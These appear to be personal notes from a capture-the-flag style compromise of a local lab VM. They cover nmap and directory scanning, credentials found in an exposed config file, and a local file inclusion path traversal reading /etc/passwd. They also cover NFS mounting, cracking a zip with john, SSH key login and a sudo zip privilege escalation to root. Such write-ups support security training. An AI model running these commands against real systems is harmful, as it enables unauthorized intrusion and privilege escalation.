```python
export TARGET_IP=192.168.254.136
export TARGET_MAC=00:0c:29:be:e9:df
export TARGET_NETWORK=192.168.254.0/24
```

scanning
```python
sudo arp-scan -l  
```
192.168.254.136	00:0c:29:be:e9:df	VMware, Inc.


nmap port disco
```python
sudo nmap -T4 $TARGET_IP
```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
8080/tcp  open  http-proxy
39267/tcp open  unknown
40127/tcp open  unknown
44855/tcp open  unknown
50607/tcp open  unknown


```python
sudo nmap -A -T4 -p 21,22,80,111,2049,8080,39267,40127,44855,50607 -v $TARGET_IP
```

PORT      STATE  SERVICE  VERSION
21/tcp    closed ftp
22/tcp    open   ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:96:ec:08:2f:b1:ea:06:ca:fc:46:8a:7e:8a:e3:55 (RSA)
|   256 56:32:3b:9f:48:2d:e0:7e:1b:df:20:f8:03:60:56:5e (ECDSA)
|_  256 95:dd:20:ee:6f:01:b6:e1:43:2e:3c:f4:38:03:5b:36 (ED25519)
80/tcp    open   http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Bolt - Installation error
111/tcp   open   rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      34431/tcp6  mountd
|   100005  1,2,3      39267/tcp   mountd
|   100005  1,2,3      49004/udp   mountd
|   100005  1,2,3      56697/udp6  mountd
|   100021  1,3,4      40761/udp   nlockmgr
|   100021  1,3,4      44357/tcp6  nlockmgr
|   100021  1,3,4      44855/tcp   nlockmgr
|   100021  1,3,4      54956/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open   nfs      3-4 (RPC #100003)
8080/tcp  open   http     Apache httpd 2.4.38 ((Debian))
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
39267/tcp open   mountd   1-3 (RPC #100005)
40127/tcp open   mountd   1-3 (RPC #100005)
44855/tcp open   nlockmgr 1-4 (RPC #100021)
50607/tcp open   mountd   1-3 (RPC #100005)
MAC Address: 00:0C:29:BE:E9:DF (VMware)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Uptime guess: 44.366 days (since Thu Sep 26 17:54:58 2024)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.19 ms 192.168.254.136

```python
gobuster dir -u http://$TARGET_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

```python
dirb http://$TARGET_IP -w
```
found dir with file containing 
   driver: sqlite
    databasename: bolt
    username: bolt
    password: I_love_java

```python
dirb http://$TARGET_IP:8080 -w
```
found
http://192.168.254.136:8080/dev/index.php
took me to bolt cms login page version 6.03
found
http://192.168.254.136:8080/dev/pages/member.admin
http://192.168.254.136:8080/dev/pages/member.thisisatest
contents:

~data~
password: I_love_java
~
~data~
password: thisisatest
~
used
username: admin
password: I_love_java
successful login

found CVE
https://www.exploit-db.com/exploits/48411
local file inclusion
http://192.168.254.136:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd
success

found user
jeanpaul:x:1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash
 i think this is his password
~data~
password: thisisatest
~

```python
showmount -e 192.168.254.136
```

```python
sudo mkdir -p /mnt/nfs
sudo mount -t nfs 192.168.254.136:/srv/nfs /mnt/nfs
```

used ls -lah and found save.zip

```python
cp save.zip /home/kali/peh/dev/save.zip
```
password protected

```python
zip2john save.zip > save.hash
```

```python
sudo john --wordlist=/usr/share/wordlists/rockyou.txt save.hash
```

contains two files
todo.txt
id_rsa

```python
chmod 600 id_rsa
```

```python
ssh jeanpaul@192.168.254.136
```
passphrase = thisisatest

checked sudo -l
zip was on there

GTFOBins
```python
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```
boom root!

cd /root
pwd 
/root
ls -alh
total 36K
drwx------  4 root root 4.0K Nov 15  2022 .
drwxr-xr-x 18 root root 4.0K Jun  1  2021 ..
lrwxrwxrwx  1 root root    9 Nov 15  2022 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root 4.0K Jun  1  2021 .config
-rw-r--r--  1 root root   31 Jun  2  2021 flag.txt
drwxr-xr-x  3 root root 4.0K Jun  1  2021 .local
-rw-------  1 root root    1 Jun 28  2021 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root  303 Jun  1  2021 .wget-hsts
cat flag.txt
Congratz on rooting this box !
